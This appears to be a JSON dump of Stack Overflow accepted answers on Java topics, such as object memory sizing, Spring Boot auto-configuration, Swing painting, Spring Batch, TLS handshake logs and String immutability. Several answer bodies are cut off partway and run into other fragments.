<code>Integer</code> to have a size of 16 bytes (12b header and 4b <code>int</code>), <code>Date</code> would be 24 bytes (12b header, 8b <code>fastTime</code> and 4b <code>cdate</code> reference), String would be 12b header, 4b char[] reference, 8b other fields, 12h char[] header and 2*length bytes for the characters themselves (or 36 + 2 * length in total).</p>\n<p>Thus let's say your 85 columns are split into 20 integers, 10 dates and 55 strings of 256 bytes max length. One row would that need <em>at least</em> 20 * 16 + 10 * 24 + 55 * 548 = 30700 bytes. 10k rows would thus need 307000000 bytes or roughly 300 MB (when all strings are at maximum length).</p>\n<blockquote>\n<p>If I copy whole data and save it in file it shows only 604 KB for 10,000 records having 8 columns.</p>\n</blockquote>\n<p>Let's break that down a little as well:</p>\n<ul>\n<li>604 KB would be 618496 bytes (1024 being one KB)</li>\n<li>Devide that by 10k and you get 61.8 bytes per row on average</li>\n<li>Devide that by 8 and you get 7.7 bytes per column (if we don't take any row or column delimiters into account)</li>\n<li>Let's round it up to 8 bytes per column and let's assume your text file is Latin-1 encoded (so 1 byte per char), thus each text column has 8 chars on average which is pretty short</li>\n</ul>\n<p>In an easier calculation, if we use the same asumptions as above, 604KB would mean your data would consist of roughly 604k characters, which in Java would need 1208k bytes (or about 1.2 MB) just for the character data alone. Add to that the overhead for 80k strings, i.e. 36 bytes * 80k which is about 2.8 MB more so that data would need about 4 MB in memory.</p>\n"},{"owner":{"account_id":298886,"reputation":39242,"user_id":605153,"user_type":"registered","accept_rate":67,"profile_image":"https://www.gravatar.com/avatar/771f1c4e90ceeec0060c62ff0dbb762e?s=256&d=identicon&r=PG","display_name":"Mark Bramnik","link":"https://stackoverflow.com/users/605153/mark-bramnik"},"up_vote_count":3,"is_accepted":true,"score":3,"creation_date":1592481670,"answer_id":62449524,"question_id":62447730,"body":"<p>Spring Factories, if configured correctly, have nothing to do with component scanning.</p>\n\n<p>I can confirm that you did everything right, the same configuration worked for my projects many times.

If something is wrong here, check the dependencies in <code>pom.xml</code> the autoconfiguration module should be defined as a dependency of your spring boot application. </p></li>\n<li><p>Make sure that the configuration indeed loads (which means in turn the autoconfig module is recognized):</p></li>\n</ol>\n\n<p>Rewrite the configuration in the following way:</p>\n\n<pre><code>@Configuration\npublic class StartupNotificationAutoConfiguration {\n\n    public StartupNotificationAutoConfiguration() {\n          System.out.println(\"Loading the configuration StartupNotificationAutoConfiguration\"); // or use logging framework\n    }\n\n   @ConditionalOnMissingBean\n   @Bean\n   StartupNotificationPublisher startupNotificationPublisher()\n   {\n    return new StartupNotificationPublisher(\"helloTopic\");\n   }\n}\n</code></pre>\n\n<p>If you see this message, then auto-configuration module is there and gets loaded by spring.</p>\n\n<ol start=\"4\">\n<li>Try to Remove <code>@ConditionalOnMissingBean</code> annotation. If the bean is defined in your application it will take precendence over beans defined in auto-configuration modules anyway. It can be a source of your issue as well.</li>\n</ol>\n"},{"owner":{"account_id":13170666,"reputation":70062,"user_id":9513184,"user_type":"registered","profile_image":"https://www.gravatar.com/avatar/176386ce0b94057e55352484e69707f9?s=256&d=identicon&r=PG&f=y&so-version=2","display_name":"Unmitigated","link":"https://stackoverflow.com/users/9513184/unmitigated"},"up_vote_count":3,"is_accepted":true,"score":3,"creation_date":1683596579,"answer_id":76205334,"question_id":76205282,"body":"<p>There is a newline at the end of the string.

Swing provides a plug'n'play style for it's UI components, via the <a href=\"https://docs.oracle.com/javase/tutorial/uiswing/lookandfeel/index.html\" rel=\"nofollow noreferrer\">Look and Feel API</a>, this means that it's possible for a button to appear differently on different platforms.</p>\n<p><code>Border</code> also doesn't &quot;fill&quot;, it just paints the outline of the border itself, see <a href=\"https://docs.oracle.com/javase/tutorial/uiswing/components/border.html\" rel=\"nofollow noreferrer\">How to Use Borders</a> for more details.</p>\n<p>This leaves you with two options.  Either create a custom <code>JButton</code>, making use of things like <code>Border</code> and overriding <code>paintComponent</code> or creating a custom Look and Feel delegate, as demonstrated above.</p>\n<p>There are arguments for and against both, but when you need to realise is, <code>JButton</code> is actually quite a complex component and requires some effort to design for.</p>\n<p>I would also recommend taking the time to look over:</p>\n<ul>\n<li><a href=\"https://www.oracle.com/java/technologies/painting.html\" rel=\"nofollow noreferrer\">Painting in AWT and Swing</a></li>\n<li><a href=\"https://docs.oracle.com/javase/tutorial/uiswing/painting/index.html\" rel=\"nofollow noreferrer\">Performing Custom Painting</a></li>\n<li><a href=\"https://docs.oracle.com/javase/tutorial/2d/index.html\" rel=\"nofollow noreferrer\">2D Graphics</a></li>\n</ul>\n"},{"owner":{"account_id":19092422,"reputation":48211,"user_id":13942448,"user_type":"registered","profile_image":"https://i.stack.imgur.com/yzJsY.jpg?s=256&g=1","display_name":"jccampanero","link":"https://stackoverflow.com/users/13942448/jccampanero"},"up_vote_count":0,"is_accepted":true,"score":0,"creation_date":1683384889,"answer_id":76189548,"question_id":76164429,"body":"<p>Sorry, because in my original answer I didn't realize that of course you are processing a full Jira page, not only the text fragments that you exemplified.</p>\n<p>I am not sure if it will work in every case, but I tested your code and - after the regex expressions drove me crazy - I think I came up with a possible solution:</p>\n<pre class=\"lang-java prettyprint-override\"><code>String input1 = &quot;||Heading 1 Table 1||Heading 2 Table 1||\\n&quot; +\n    &quot;|_*BOLD AND ITALIC*_|_Italic_|\\n&quot; +\n    &quot;|Normal key|Normal Value|\\n&quot; +\n    &quot;|Third row, *just half BOLD*| |&quot;;\n\nString input2 = &quot;||Heading 1 Table 2||Heading 2 Table 2||\\n&quot; +\n    &quot;|Col A1|Col A2|\\n&quot; +\n    &quot;|SECOND ROW|Second row too|\\n&quot; +\n    &quot;|Row with image|!image-2023-04-24-17-51-07-167.png|width=359,height=253!|\\n&quot; +\n    &quot;|Row with image and text |smol  !image-2023-05-02-12-42-16-942.png|width=347,height=231!

That means that when <code>skip</code> is called on the query, it is skipping over <em>unprocessed data</em> since the processed data was excluded from the query.</p>\n<p><strong>The conclusion from this is that it is not possible to update the data while it is being processed.</strong></p>\n<hr />\n<p>The workaround I used was to remove the query parameter for <code>processedAt</code> and create a new <code>ItemProcessor</code> that checks if the item has been processed before passing it on to <code>ItemWriter</code>. The efficiency of this is questionable. If you expect the query to return mostly data that is valid for processing (i.e. without the <code>processedAt</code> field), then it's a good solution. If you expect a lot of data is going to be discarded because it already has a <code>processedAt</code> flag, then you might want to look into other solutions (and please do share them if you figure something out).</p>\n<p>This is what the <code>ItemProcessor</code> looks like, nothing fancy:</p>\n<pre><code>public class MyItemProcessor implements ItemProcessor&lt;TroublesomeModel, TroublesomeModel&gt; {\n    @Override\n    public TroublesomeModel process(TroublesomeModel item) throws Exception {\n        if (item.getProcessedAt() != null) {\n            return null;\n        }\n        return item;\n    }\n}\n</code></pre>\n<p>And since I am using <code>BulkOperations</code> in my <code>ItemWriter</code> which cannot handle empty lists, there needs to be a null check before entering it as well.</p>\n<hr />\n<p>An alternative workaround would be to just execute the query as-is, with the <code>processedAt</code> flag, set a <code>reader.maxItemCount</code> to a low enough number (in my case 1000), and re-run the job inside a scheduler on repeat. This fits my use case since it's supposed to actively process data as it arrives. No data is duplicated and it doesn't cause any unnecessary data processing or lengthy database queries.</p>\n"},{"owner":{"account_id":3460456,"reputation":155615,"user_id":2897748,"user_type":"registered","profile_image":"https://www.gravatar.com/avatar/936c09c1cf2b6492c0d59833be11a8bc?s=256&d=identicon&r=PG&f=y&so-version=2","display_name":"Dmitri T","link":"https://stackoverflow.com/users/2897748/dmitri-t"},"up_vote_count":0,"is_accepted":true,"score":0,"creation_date":1683545768,"answer_id":76200216,"question_id":76200153,"body":"<p>You could just use JMeter's <a href=\"https://jmeter.apache.org/usermanual/jmeter_proxy_step_by_step.html\" rel=\"nofollow noreferrer\">HTTP(S) Test Script Recorder</a> as a proxy for the Neoload.</p>\n<p>Given you:</p>\n<ul>\n<li>Start JMeter's HTTP(S) Test Script Recorder</li>\n<li><a href=\"https://documentation.tricentis.com/neoload/9.0/en/WebHelp/#683.htm#o24279\" rel=\"nofollow noreferrer\">Configure Neoload to use JMeter as a proxy</a></li>\n</ul>\n<p>when you replay your test scenario in Neoload JMeter will capture the requests and generate appropriate <a href=\"https://jmeter.apache.org/usermanual/component_reference.html#HTTP_Request\" rel=\"nofollow noreferrer\">HTTP Request</a> samplers and <a href=\"https://jmeter.apache.org/usermanual/component_reference.html#HTTP_Header_Manager\" rel=\"nofollow noreferrer\">HTTP Header Managers</a>.</p>\n<p>You will need to perform <a href=\"https://jmeter.apache.org/usermanual/jmeter_proxy_step_by_step.html#correlate-start\" rel=\"nofollow noreferrer\">correlation</a> manually however.

the original code was from a snake game made by &quot;Bro Code&quot; on youtube</p>\n</blockquote>\n<p>As a &quot;general&quot; recommendation, I'd avoid YouTube for learning code, apart from going out of date really fast, SO seems to be spending an lot of time correcting the code examples coming from YouTube.</p>\n<p>First, I'd recommend you take the time to read through <a href=\"https://www.oracle.com/java/technologies/painting.html\" rel=\"nofollow noreferrer\">Painting in AWT and Swing</a> and <a href=\"https://docs.oracle.com/javase/tutorial/uiswing/painting/index.html\" rel=\"nofollow noreferrer\">Performing Custom Painting</a> to make sure you have a baseline understanding of the painting process in Swing.</p>\n<p>As to your question, if need to keep track what is visible.  Depending on how you want it to workflow, I might have a pool of &quot;entities&quot; which which you can randomly pick and move them to a &quot;visible entities&quot; pool.  When a new paint cycle runs, you'd simply paint the &quot;visible entities&quot;.</p>\n<p>You need to take into consideration how long an entity should be displayed and each time your &quot;game loop&quot; runs, you'd need to check to see if any of the visible entities have &quot;died&quot;, at which point you'd remove from the &quot;visible entities&quot; pool and put them back in the &quot;entities pool&quot;.</p>\n<p>For example...</p>\n<pre><code>import java.awt.Dimension;\nimport java.awt.EventQueue;\nimport java.awt.Graphics;\nimport java.awt.Graphics2D;\nimport java.awt.Rectangle;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.awt.event.MouseAdapter;\nimport java.awt.event.MouseEvent;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Random;\nimport javax.swing.JFrame;\nimport javax.swing.JPanel;\nimport javax.swing.Timer;\n\npublic class Main {\n    public static void main(String[] args) {\n        new Main();\n    }\n\n    public Main() {\n        EventQueue.invokeLater(new Runnable() {\n            @Override\n            public void run() {\n                JFrame frame = new JFrame();\n                frame.add(new TestPane());\n                frame.pack();\n                frame.setLocationRelativeTo(null);\n                frame.setVisible(true);\n            }\n        });\n    }\n\n    public class StopWatch {\n        private Instant startedAt;\n        private Duration duration;\n\n        public void setDuration(Duration duration) {\n            this.duration = duration;\n        }\n\n        public Duration getDuration() {\n            return duration;\n        }\n\n        public void start() {\n            startedAt = Instant.now();\n        }\n\n        public Instant getStartedAt() {\n            return startedAt;\n        }\n\n        public Duration getTimeRemaining() {\n            Instant startedAt = getStartedAt();\n            Duration duration = getDuration();\n            if (startedAt == null || duration == null) {\n                return Duration.ZERO;\n            }\n            Duration runtime = Duration.between(startedAt, Instant.now());\n            return duration.minus(runtime);\n        }\n\n        public boolean hasTimeRemaining() {\n            Duration timeRemaining = getTimeRemaining();\n            return timeRemaining.toMillis() &gt;

We feel that\nmappings are not collections and\ncollections are not mappings. Thus, it\nmakes little sense for Map to extend\nthe Collection interface (or vice\nversa).</p>\n<p>If a Map is a Collection, what are the\nelements? The only reasonable answer\nis &quot;Key-value pairs&quot;, but this\nprovides a very limited (and not\nparticularly useful) Map abstraction.\nYou can't ask what value a given key\nmaps to, nor can you delete the entry\nfor a given key without knowing what\nvalue it maps to.</p>\n<p>Collection could be made to extend\nMap, but this raises the question:\nwhat are the keys? There's no really\nsatisfactory answer, and forcing one\nleads to an unnatural interface.</p>\n<p>Maps can be viewed as Collections (of\nkeys, values, or pairs), and this fact\nis reflected in the three &quot;Collection\nview operations&quot; on Maps (keySet,\nentrySet, and values). While it is, in\nprinciple, possible to view a List as\na Map mapping indices to elements,\nthis has the nasty property that\ndeleting an element from the List\nchanges the Key associated with every\nelement before the deleted element.\nThat's why we don't have a map view\noperation on Lists.</p>\n</blockquote>\n<p><strong>Update:</strong> I think the quote answers most of the questions. It's worth stressing the part about a collection of entries not being a particularly useful abstraction. For example:</p>\n<pre><code>Set&lt;Map.Entry&lt;String,String&gt;&gt;\n</code></pre>\n<p>would allow:</p>\n<pre><code>set.add(entry(&quot;hello&quot;, &quot;world&quot;));\nset.add(entry(&quot;hello&quot;, &quot;world 2&quot;));\n</code></pre>\n<p>(assuming an <code>entry()</code> method that creates a <code>Map.Entry</code> instance)</p>\n<p><code>Map</code>s require unique keys so this would violate this. Or if you impose unique keys on a <code>Set</code> of entries, it's not really a <code>Set</code> in the general sense. It's a <code>Set</code> with further restrictions.</p>\n<p>Arguably you could say the <code>equals()</code>/<code>hashCode()</code> relationship for <code>Map.Entry</code> was purely on the key but even that has issues. More importantly, does it really add any value? You may find this abstraction breaks down once you start looking at the corner cases.</p>\n<p>It's worth noting that the <code>HashSet</code> is actually implemented as a <code>HashMap</code>, not the other way around. This is purely an implementation detail but is interesting nonetheless.</p>\n<p>The main reason for <code>entrySet()</code> to exist is to simplify traversal so you don't have to traverse the keys and then do a lookup of the key. Don't take it as prima facie evidence that a <code>Map</code> should be a <code>Set</code> of entries (imho).</p>\n"},{"owner":{"account_id":2791034,"reputation":3837,"user_id":2401265,"user_type":"registered","accept_rate":56,"profile_image":"https://www.gravatar.com/avatar/16369b0c7c1f0fff22ff47be0a22289a?s=256&d=identicon&r=PG","display_name":"gmetax","link":"https://stackoverflow.com/users/2401265/gmetax"},"up_vote_count":66,"is_accepted":true,"score":64,"creation_date":1441369825,"answer_id":32398137,"question_id":32398104,"body":"<p><strong>Update 2018 (kotlin version)</strong></p>\n\n<pre><code>fun Toolbar.changeToolbarFont(){\n    for (i in 0 until childCount) {\n        val view = getChildAt(i)\n        if (view is TextView &amp;&amp; view.text == title) {\n            view.typeface = Typeface.createFromAsset(view.context.assets, \"fonts/customFont\")\n            break\n        }\n    }\n}\n</code></pre>\n\n<p>and use it like that <code>toolBar.changeToolbarFont()</code></p>\n\n<p><strong>old-post</strong></p>\n\n<p>To use a custom title in your Toolbar all you need to do is remember is that Toolbar is just a fancy ViewGroup so you can add a custom title like so:</p>\n\n<pre><code>&lt;android.support.v7.widget.Toolbar\n    android:id=\"@+id/toolbar_top\"\n    android:layout_height=\"wrap_content\"\n    android:layout_width=\"match_parent\"\n    android:minHeight=\"?attr/actionBarSize\"\n    android:background=\"@color/action_bar_bkgnd\"\n    app:theme=\"@style/ToolBarTheme\" &gt;\n\n\n     &lt;TextView\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"Toolbar Title\"\n        android:layout_gravity=\"center\"\n        android:id=\"@+id/toolbar_title\" /&gt;\n\n\n    &lt;/android.support.v7.widget.Toolbar&gt;\n</code></pre>\n\n<p>This means that you can style the TextView however you would like because it's just a regular TextView.

You're trying to communicate with an Android device. When talk about pure Java SDK. It has certain methods to communicate with the OS with the help of JVM. But even Android is a Linux kernel based OS, you can't do it directly. IT's because pure Java SDK doesn't come with tools to contact an Android VM. To do that you need Android SDK.</p>\n<p>Of course you can get some information in the way of @Robert But it'll not be recommended by Google. It'll create unsecure situations (Not the given example by @Robert). Perhaps your app may be flagged as insecure and maybe removed, if you tried to use pure SDK somehow. So it's not recommended at all.</p>\n<p>If your problem is that you want to create a jar library that can communicate with both PC and Android, they there's a proper way of doing it. You can use Kotlin Multiplatform Library (Can be created using IntelliJ Idea). Or you just can create KVVM project in Android Studio.

You can use Android SDK codes if the device is an Android and can use pure Java SDK if it's a PC.</p>\n<p>(I'm just guessing what you need) And what did you mean by,</p>\n<blockquote>\n<p>I'm developing a pure java SDK</p>\n</blockquote>\n<p>For android if you use Android SDK you can use these methods</p>\n<pre><code>System.getProperty(&quot;os.version&quot;) //To get OS and Version\nandroid.os.Build.VERSION.INCREMENTAL //To get OS Version\nandroid.os.Build.VERSION.SDK_INT // To Get API Level\nandroid.os.Build.DEVICE //To get Device\nandroid.os.Build.MODEL //To get Device Model\nandroid.os.Build.PRODUCT //To get Device Product.\n</code></pre>\n<p>But I highly recommend if you're developing a library or something for both platforms. Kotlin Multiplatform Library (No need to use Kotlin, you can use Java) have <code>android</code>, <code>native</code>, <code>jvm</code> and <code>common</code> source directories, so you can share common codes with your <code>jvm</code> library and android library.</p>\n<p>I reccomend you researching more for library (in your words SDK) development.</p>\n"},{"owner":{"account_id":3473020,"reputation":137,"user_id":2906912,"user_type":"registered","profile_image":"https://www.gravatar.com/avatar/fb5da891277a67c62a8df722308a5a2b?s=256&d=identicon&r=PG&f=y&so-version=2","display_name":"Codified","link":"https://stackoverflow.com/users/2906912/codified"},"up_vote_count":1,"is_accepted":true,"score":1,"creation_date":1683405925,"answer_id":76191055,"question_id":76190468,"body":"<p>You shouldn't be dividing by total number of ratings (numRatimgs) [this is what causing issue for you]</p>\n<pre><code>double avgRating = totalRating / numRatings;\n</code></pre>\n<p>Instead you should divide it by actual number of occurrences of that particular movie until that time.\nMay be you can have a pojo called MoviRating where you can have properties inside it like - totalReviews,totalRating and averageRating\nIn your map you can have data as &lt;String, MovieRating&gt;\nAnd keep updating the data in pojo.\nHope this helps you.</p>\n"},{"owner":{"account_id":5152799,"reputation":18584,"user_id":4126893,"user_type":"registered","profile_image":"https://i.stack.imgur.com/QkJgc.gif?s=256&g=1","display_name":"Metroids","link":"https://stackoverflow.com/users/4126893/metroids"},"up_vote_count":1,"is_accepted":true,"score":1,"creation_date":1683408916,"answer_id":76191259,"question_id":76190618,"body":"<p>You can't nest expressions like you are doing -- <code>*{ ... ${ ... } ... }</code> is not valid Thymeleaf syntax.

The order in which each\n  handler is called is based on the hierarchy of event types. Handlers\n  for a specific event type are executed before handlers for generic\n  event types. For example, a handler for the KeyEvent.KEY_TYPED event\n  is called before the handler for the InputEvent.ANY event. The order\n  in which two handlers at the same level are executed is not specified,\n  with the exception that handlers that are registered by the\n  convenience methods described in Working with Convenience Methods are\n  executed last.</p>\n</blockquote>\n\n<p><strong>2:</strong> The second difference is that you can add Multiple handler with Same <code>EventType</code> ( as I used Mouse_Entered Event) using <code>addEventHandler();</code> but in case of <code>setOnXXX();</code> last registered event handler will execute. Here is the Example.</p>\n\n<pre><code>Button btn = new Button(\"Hover Me!\");\n\nbtn.setOnMouseEntered(new EventHandler&lt;MouseEvent&gt;() {\n    public void handle(MouseEvent event) {\n        System.out.println(\"Handling event 1 with Convenience Method\"); \n    }\n});\nbtn.setOnMouseEntered(new EventHandler&lt;MouseEvent&gt;() {\n    public void handle(MouseEvent event) {\n        System.out.println(\"Handling event 2 with Convenience Method\"); \n    }\n});\nbtn.addEventHandler(MouseEvent.MOUSE_ENTERED, new EventHandler&lt;MouseEvent&gt;() {\n    public void handle(MouseEvent event) {\n        System.out.println(\"Handling event 1 with addEventHandler\"); \n    }\n});\n\nbtn.addEventHandler(MouseEvent.MOUSE_ENTERED, new EventHandler&lt;MouseEvent&gt;() {\n    public void handle(MouseEvent event) {\n        System.out.println(\"Handling event 2 with addEventHandler\"); \n    }\n});\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Handling event 1 with addEventHandler\nHandling event 2 with addEventHandler\nHandling event 2 with Convenience Method\n</code></pre>\n\n<p>As you see I registered two event handler using both ways. But in convenience method's way the last event handler executed. To complete the answer let me copy the paragraph from <strong>jns</strong>'s answer.</p>\n\n<blockquote>\n  <p>So if you need only one <code>EventHandler</code> it makes no difference which\n  method you use. However, if you need to <strong>apply several EventHandlers</strong>\n  for the same <code>EventType</code> you have to add them using <code>addEventhandler</code></p>\n</blockquote>\n"},{"owner":{"account_id":19092422,"reputation":48211,"user_id":13942448,"user_type":"registered","profile_image":"https://i.stack.imgur.com/yzJsY.jpg?s=256&g=1","display_name":"jccampanero","link":"https://stackoverflow.com/users/13942448/jccampanero"},"up_vote_count":3,"is_accepted":true,"score":3,"creation_date":1674404747,"answer_id":75202040,"question_id":74772255,"body":"<p>For different reasons, <a href=\"https://bugs.eclipse.org/bugs/show_bug.cgi?id=317777\" rel=\"nofollow noreferrer\">this issue</a> and <a href=\"https://www.eclipse.org/forums/index.php?t=msg&amp;th=170219&amp;start=0\" rel=\"nofollow noreferrer\">this related article</a> enumerate some of them, EclipseLink uses <code>EXISTS</code> in the <code>countDistinct</code> operation implementation.</p>\n<p>Although I can agree with you, be aware that the performance offered by <code>EXISTS</code> in Oracle is in fact very dependent of the use case, and it doesn't have to be poor.

So when you create your <code>String</code> from the ciphertext, the <code>String</code> constructor (which applies a character encoding to turn the bytes into characters) essentially has to throw away some of the bytes because it can make no sense of them.  Thus, when you get bytes out of the string, they are not the same bytes you put into the string.</p>\n\n<p>In Java (and in modern programming in general), you cannot assume that one character = one byte, unless you know absolutely you're dealing with ASCII.

In the end, either using a ItemPreparedStatementSetter or a ItemSqlParameterSourceProvider should be fine for this case.

SSL logging is turned on using  <code>-Djavax.net.debug=ssl:handshake:verbose</code>.

I've observed that, when connections fail from the problematic linux service, TLSv1.2 is ALWAYS the level which was selected. However, connections do not ALWAYS fail when TLSv1.2 is used.  They only fail 5-10% of the time.</p>\n\n<p>Now here is an exchange from a server that does NOT have the problem.  Everything else is equal. I.e.,  connecting to the same database, same version of the JVM (Java 1.8.0_60), same JDBC driver, etc.  Notice that, here, <strong>TLSv1</strong> is selected by the database server instead of TLSv1.2 as in the faulty server's case.</p>\n\n<pre><code>*** ClientHello, TLSv1.2\n--- 8&lt;-- SNIP -----\nmain, WRITE: TLSv1.2 Handshake, length = 207\nmain, READ: TLSv1 Handshake, length = 604\n*** ServerHello, TLSv1\n--- 8&lt;-- SNIP -----\nCipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA\n--- 8&lt;-- SNIP -----\n%% Initialized:  [Session-79, TLS_RSA_WITH_AES_128_CBC_SHA]\n** TLS_RSA_WITH_AES_128_CBC_SHA\n--- 8&lt;-- SNIP -----\nAlgorithm: [SHA1withRSA]\n--- 8&lt;-- SNIP -----\n***\n*** ServerHelloDone\n*** ClientKeyExchange, RSA PreMasterSecret, TLSv1\n--- 8&lt;-- SNIP -----\nmain, WRITE: TLSv1 Handshake, length = 134\nmain, WRITE: TLSv1 Change Cipher Spec, length = 1\n*** Finished\nverify_data:  { 26, 155, 166, 89, 229, 193, 126, 39, 103, 206, 126, 21 }\n***\nmain, WRITE: TLSv1 Handshake, length = 48\nmain, READ: TLSv1 Change Cipher Spec, length = 1\nmain, READ: TLSv1 Handshake, length = 48\n*** Finished\n</code></pre>\n\n<p>So, when TLSv1 is negotiated between the Linux JVM and the SQL Server, connections are ALWAYS successful.  When TLSv1.2 is negotiated, we get sporadic connection failures.  </p>\n\n<p>(Note: Java 7 (1.7.0_51) always negotiates TLSv1, which is why the problem never occurred for us with a Java 7 JVM.)</p>\n\n<p>The open questions we still have are: </p>\n\n<ol>\n<li>WHY is that the same Java 8 JVM run from 2 different Linux servers will always negotiate TLSv1, but when connecting from another Linux server it always negotiates TLSv1.2.  </li>\n<li>And also why are TLSv1.2 negotiated connections successful most, but not all, of the time on that server?</li>\n</ol>\n\n<p><strong>Update

It is immutable, and short of some really dirty and dangerous tricks (using reflection, for example) you cannot alter that.</p>\n<p>So the safest solution is to not put the data into a <code>String</code> in the first place.  Use a <code>StringBuilder</code> or an array of characters instead, or some other representation that is not immutable.  (And then clear it when you are done.   And don't use <code>toString()</code> etc on the <code>StringBuilder</code> or you have created the <code>String</code> you were trying to avoid.)</p>\n<p>Of course, the &quot;safest&quot; solution is rather impractical.  Many Java SE and 3rd party APIs <em>require</em> or <em>return</em> text data to be provided as <code>String</code> objects.</p>\n<hr />\n<p>For the record, there are a couple of ways that you can change the contents of a String's backing array.  For example, you can use reflection to fish out a reference to the <code>String</code> object's backing array, and overwrite its contents.  However, this involves doing things that the JLS states have unspecified behavior so  you cannot guarantee that the optimizer won't do something unexpected.  And the code to do this will be non-portable, since it depends on internal details of <code>String</code> that <em>have changed</em> over time and may change again.</p>\n<hr />\n<p>My personal take on this is that you are better off locking down your application platform so that unauthorized people can't gain access to the memory / memory dump in the first place.  After all, if the platform is not properly secured, the &quot;bad guys&quot; may be able to get hold of the string contents before you erase it.  Steps like this might be warranted for small amounts of security critical state, but if you've got a lot of &quot;confidential&quot; information to process, it is going to be a major hassle to not be able to use normal strings and string handling.</p>\n"},{"owner":{"account_id":7189653,"reputation":313,"user_id":5490469,"user_type":"registered","profile_image":"https://i.stack.imgur.com/SJ3K3.png?s=256&g=1","display_name":"jakub","link":"https://stackoverflow.com/users/5490469/jakub"},"up_vote_count":9,"is_accepted":true,"score":9,"creation_date":1461061529,"answer_id":36715644,"question_id":36675617,"body":"<p>Finally I find out...\nFile -> Project Structure -> Module...\nAnd for every module I had to set version 8...(there was version 5 I don't know why...)</p>\n"},{"owner":{"account_id":2985220,"reputation":5435,"user_id":2534236,"user_type":"registered","accept_rate":72,"profile_image":"https://www.gravatar.com/avatar/16e3a19d1371e848ad1a2f4c33721977?s=256&d=identicon&r=PG&f=y&so-version=2","display_name":"Suganthan Madhavan Pillai","link":"https://stackoverflow.com/users/2534236/suganthan-madhavan-pillai"},"up_vote_count":6,"is_accepted":true,"score":6,"creation_date":1390729950,"answer_id":21362006,"question_id":21361781,"body":"<p>This is the project structure</p>\n\n<p><img src=\"https://i.stack.imgur.com/VjjiD.png\" alt=\"Project Structure\"></p>\n\n<p>Try with this</p>\n\n<p><strong>Update</strong></p>\n\n<pre><code>    public static void main(String[] args) {\n    // TODO Auto-generated method stub\n    try {\n        Class.forName(\"com.mysql.jdbc.Driver\");\n    } catch (ClassNotFoundException e) {\n        System.out.println(\"Where is your MySQL JDBC Driver?\");\n        e.printStackTrace();\n        return;\n    }\n\n    System.out.println(\"MySQL JDBC Driver Registered!\");\n    Connection connection = null;\n\n    try {\n        connection = DriverManager\n        .getConnection(\"jdbc:mysql://localhost:3306/testspring\",\"root\", \"password\");\n\n    } catch (SQLException e) {\n        System.out.println(\"Connection Failed!

Assuming you're okay with getting a generics warning you end up <code>@SuppressWarnings</code> ignoring, you can just make the types work fine, too.

Looks something like this:</p>\n<pre><code>private final Map translators = new HashMap&lt;&gt;(); // intentionally raw.\n\npublic &lt;E&gt; void register(Class&lt;E&gt; type, Function&lt;? super E, String&gt; translator) {\n  this.translators.put(type, translator);\n}\n\npublic String translate(Object o) {\n  Class&lt;?&gt; t = o.getClass(); // NPE intentional\n  while (t != null) {\n    Object translator = translators.get(t);\n    if (translator != null) {\n      return (String) ((Function) translator).apply(o);\n    }\n    t = t.getSuperclass();\n  }\n  throw new IllegalArgumentException(&quot;No translator available to translate &quot; + o.getClass()):\n}\n\nregister(Integer.class, Integer::toString);\nregister(InputStream.class, i -&gt; &quot;Hello, World!&quot;);\nregister(LocalDate.class, ld -&gt; myFancyDateFormatter.format(ld));\n\ntranslate(LocalDate.of(2022, 4, 1));\n</code></pre>\n<p>Generics can't do the job of linking together the idea that every key in your <code>translators</code> map is related to a typevar in the associated value, hence you have to eat some generics warnings.

I suggest you add a check for this (check if the <code>Class&lt;E&gt; type</code> arg is an interface, and throw an <code>IllegalArgumentException</code>). Alternatively, you need to expand the code considerably and use recursion or a queue because any given type needs to add not just its superclass to the queue, but also all its interfaces (which can have multiple parent interfaces and so on.

So, you ask your friend who was busy working in the garden to stop what they're doing and run out to buy some flour. Then, the very moment your friend steps out the door, you try to proceed with making the recipe, but What the ???? There's no flour! How can there be no flour when I just sent him out the door to get some?</p>\n<p>You're going to have to wait for the flour.</p>\n<p>Your program is trying to do the same thing. It's trying to use the books when it's only just sent the <code>LoadBooks</code> thread out to fetch them. You're going to need some way for the LoadBooks thread to signal when the books have been loaded, and you need some way for the GUI thread to wait until the signal is delivered.</p>\n<p>A <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/concurrent/Semaphore.html\" rel=\"nofollow noreferrer\"><code>Semaphore</code></a> would be good for that. The LoadBooks thread could call <code>semaphore.release()</code> to signal that the books have been loaded, and the GUI thread could call <code>semaphore.acquire()</code> to await the signal.</p>\n<hr />\n<p>But Wait!!</p>\n<p>Is there something else you could be doing in the kitchen while your friend is shopping for flour? If there is not—if you are not going to do anything at all except sit there and wait—then you might just as well have gone for the flour yourself and not interrupted your friend's work.</p>\n<p>There is practically <em>never</em> any reason for some thread A to give a task to some other thread B if thread A is going to do nothing but wait until the task is finished. It that's all you want to do, then you might as well just do the task in thread A.</p>\n<hr />\n<p>It's tricker with a GUI, because maybe you are trying to prevent the GUI from &quot;freezing up&quot; while the books are being loaded. The thing is, in that case, if the GUI doesn't freeze up, what <em>does</em> it do instead?</p>\n<p>The simplest answer to that question is to have the GUI put up a <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.desktop/java/awt/Dialog.html\" rel=\"nofollow noreferrer\"><em>modal dialog</em></a> box that says something like, &quot;loading books,&quot; and not show any controls that let the user do anything else until the books are loaded. Maybe if you're nice, you'll show a progress bar in the dialog to show them how long they will have to wait. Maybe if you are really nice, you could even give them an &quot;abort&quot; button to quit out of the program if they decide not to wait.</p>\n<p>Unfortunately, I can't say much about <em>how</em> to do those things. I've never been much of a GUI programmer, and it's been maybe a decade since I did any in Java.</p>\n"},{"owner":{"account_id":278315,"reputation":11494,"user_id":572834,"user_type":"registered","profile_image":"https://i.stack.imgur.com/aUww2.jpg?s=256&g=1","display_name":"Alexey Ivanov","link":"https://stackoverflow.com/users/572834/alexey-ivanov"},"up_vote_count":1,"is_accepted":true,"score":1,"creation_date":1644764483,"answer_id":71101882,"question_id":70672430,"body":"<p>Java 8 does not support High DPI, the UI gets scaled up by Windows. You should use Java 11 or a later version which support per-monitor High DPI settings.</p>\n<p>If your goal is to make the icons look crisp, prepare a set of icons for different resolutions using <a 